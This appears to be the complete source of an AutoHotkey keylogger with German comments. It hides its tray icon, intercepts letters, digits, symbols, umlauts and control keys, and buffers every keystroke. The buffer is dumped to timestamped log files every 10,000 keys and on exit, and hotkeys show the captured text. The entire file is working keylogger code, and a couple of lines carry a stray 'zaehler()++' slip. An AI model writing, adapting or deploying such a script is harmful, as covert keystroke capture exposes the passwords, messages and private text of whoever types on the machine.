;+---------+
;|Keylogger|
;+---------+
#NoTrayIcon

;+-----------------------------------------------------------------+
;|TODO: Shutdown- Hook einbauen, der bei Beendigung den Cache leert|
;+-----------------------------------------------------------------+
OnExit, cleanup



basename := "biglog"
suffix := "txt"
basepath := "C:\Users\Florian\Documents\Logs"

maxCount := 10000

typedText := ""
typingCount := 0

append(letter){
	global typedText := typedText . letter
	return
}

cleanup(){
	cleanup:
	global basepath
	global basename
	global suffix
	global typedText
	temp := basepath . "\" . basename . A_DD . "-"  . A_MM . "-" . A_YYYY . "_" . A_Hour . "-" . A_Min . "-" . A_Sec . "." . suffix
	file := FileOpen(temp, "w")
	file.Write(typedText . "`nProgram has been interrupted!")
	file.Close()
	ExitApp, 0
	return
}

;>>> Inkrementiert den Zähler
zaehler(){
	global basepath
	global basename
	global suffix
	global typedText
	global typingCount
	global maxCount
	typingCount += 1
	if ( typingCount > maxCount )  {
		temp := basepath . "\" . basename . A_DD . "-"  . A_MM . "-" . A_YYYY . "_" . A_Hour . "-" . A_Min . "-" . A_Sec . "." . suffix
		file := FileOpen(temp, "w")
		file.Write(typedText)
		file.Close()
		typedText := ""
		typingCount := 0
	}
	return
}

^+p::
	Msgbox, %typedText% 
return

^+c::
	Msgbox, % "Momentan befinden sich " . typingCount . " gespeicherte Tastenanschläge im Cache.`nDieser wird nach " . maxCount - typingCount . " weiteren Tastenanschlägen in eine Logdatei gesichert!"
return

^+o::
	run C:\Users\Florian\Documents\Logs
return
	
a::
append("a")
SendPlay a
zaehler()++
return
b::
append("b")
SendPlay b
zaehler()++
return
c::
append("c")
SendPlay c
zaehler()
return
d::
append("d")
SendPlay d
zaehler()
return
e::
append("e")
SendPlay e
zaehler()
return
f::
append("f")
SendPlay f
zaehler()
return
g::
append("g")
SendPlay g
zaehler()
return
h::
append("h")
SendPlay h
zaehler()
return
i::
append("i")
SendPlay i
zaehler()
return
j::
append("j")
SendPlay j
zaehler()
return
k::
append("k")
SendPlay k
zaehler()
return
l::
append("l")
SendPlay l
zaehler()
return
m::
append("m")
SendPlay m
zaehler()
return
n::
append("n")
SendPlay n
zaehler()
return
o::
append("o")
SendPlay o
zaehler()
return
p::
append("p")
SendPlay p
zaehler()
return
q::
append("q")
SendPlay q
zaehler()
return
r::
append("r")
SendPlay r
zaehler()
return
s::
append("s")
SendPlay s
zaehler()
return
t::
append("t")
SendPlay t
zaehler()
return
u::
append("u")
SendPlay u
zaehler()
return
v::
append("v")
SendPlay v
zaehler()
return
w::
append("w")
SendPlay w
zaehler()
return
x::
append("x")
SendPlay x
zaehler()
return
y::
append("y")
SendPlay y
zaehler()
return
z::
append("z")
SendPlay z
zaehler()
return
ß::
append("ß")
SendPlay ß
zaehler()
return
1::
append("1")
SendPlay 1
zaehler()
return
2::
append("2")
SendPlay 2
zaehler()
return
3::
append("3")
SendPlay 3
zaehler()
return
4::
append("4")
SendPlay 4
zaehler()
return
5::
append("5")
SendPlay 5
zaehler()
return
6::
append("6")
SendPlay 6
zaehler()
return
7::
append("7")
SendPlay 7
zaehler()
return
8::
append("8")
SendPlay 8
zaehler()
return
9::
append("9")
SendPlay 9
zaehler()
return
0::
append("0")
SendPlay 0
zaehler()
return
+a::
append("A")
SendPlay A
zaehler()
return
+b::
append("B")
SendPlay B
zaehler()
return
+c::
append("C")
SendPlay C
zaehler()
return
+d::
append("D")
SendPlay D
zaehler()
return
+e::
append("E")
SendPlay E
zaehler()
return
+f::
append("F")
SendPlay F
zaehler()
return
+g::
append("G")
SendPlay G
zaehler()
return
+h::
append("H")
SendPlay H
zaehler()
return
+i::
append("I")
SendPlay I
zaehler()
return
+j::
append("J")
SendPlay J
zaehler()
return
+k::
append("K")
SendPlay K
zaehler()
return
+l::
append("L")
SendPlay L
zaehler()
return
+m::
append("M")
SendPlay M
zaehler()
return
+n::
append("N")
SendPlay N
zaehler()
return
+o::
append("O")
SendPlay O
zaehler()
return
+p::
append("P")
SendPlay P
zaehler()
return
+q::
append("Q")
SendPlay Q
zaehler()
return
+r::
append("R")
SendPlay R
zaehler()
return
+s::
append("S")
SendPlay S
zaehler()
return
+t::
append("T")
SendPlay T
zaehler()
return
+u::
append("U")
SendPlay U
zaehler()
return
+v::
append("V")
SendPlay V
zaehler()
return
+w::
append("W")
SendPlay W
zaehler()
return
+x::
append("X")
SendPlay X
zaehler()
return
+y::
append("Y")
SendPlay Y
zaehler()
return
+z::
append("Z")
SendPlay Z
zaehler()
return
;+-------------+
;|Sonderzeichen|
;+-------------+

~+1::
	append("!")
	zaehler()
return
<^>!+::
	append("~")
	SendPlay ~
	zaehler()
return
§::
	append("§")
	SendPlay §
	zaehler()
return
~%::
	append("%")
	zaehler()
return
~$::
	append("$")
	zaehler()
return
~&::
	append("&")
	zaehler()
return
~/::
	append("/")
	zaehler()
return
<^>!ß::
	append("\")
	SendPlay \
	zaehler()
return

~(::
	append("(")
	zaehler()
return
~)::
	append(")")
	zaehler()
return
~=::
	append("=")
	zaehler()
return
~?::
	append("?")
	zaehler()
return
`::
	append("``")
	SendPlay ``
	zaehler()
return
~´::
	append("´")
	zaehler()
return
~<^>!<::
	append("|")
	zaehler()
return
~>::
	append(">")
	zaehler()
return
~<::
	append("<")
	zaehler()
return
~,::
	append(",")
	zaehler()
return
~.::
	append(".")
	zaehler()
return
~;::
	append(";")
	zaehler()
return
~+.::
	append(":")
	zaehler()
return
~-::
	append("-")
	zaehler()
return
~_::
	append("_")
	zaehler()
return
~#::
	append("#")
	zaehler()
return
~':: 
	append("'")
	zaehler()
return
~*:: 
	append("*")
	zaehler()
return
~+::
	append("+")
	zaehler()
return
~<^>!{::
	append("{")
	zaehler()
return
~<^>!}::
	append("}")
	zaehler()
return
~"::
	append("{Anührungzeichen}")
	zaehler()
return
~<^>![::
	append("[")
	zaehler()
return
~<^>!]::
	append("]")
	zaehler()
return
~+^::
	append("°")
	zaehler()
return
^::
	append("^")
	SendPlay {^}
	zaehler()
return

;+------------+
;|Steuertasten|
;+------------+

~Space::
	append(" ")
	zaehler()

return

~CapsLock::
	append("{Capslock}")
	zaehler()
return

~Tab::
	append("{Tab}")
	zaehler()
return

~Enter::
	append("{Enter}")
	zaehler()

return

~Escape::
	append("{Escape}")
	zaehler()
return

~Backspace::
	append("{Backspace}")
	zaehler()
return

~Up::
	append("{Up}")
	zaehler()
return

~Down::
	append("{Down}")
	zaehler()
return

~Left::
	append("{Left}")
	zaehler()
return

~Right::
	append("{Right}")
	zaehler()
return

;+-------+
;|umlaute|
;+-------+

~ä::
	append("ä")
	zaehler()
return

~ü::
	append("ü")
	zaehler()
return

~ö::
	append("ö")
	zaehler()
return


;+---+
;|End|
;+---+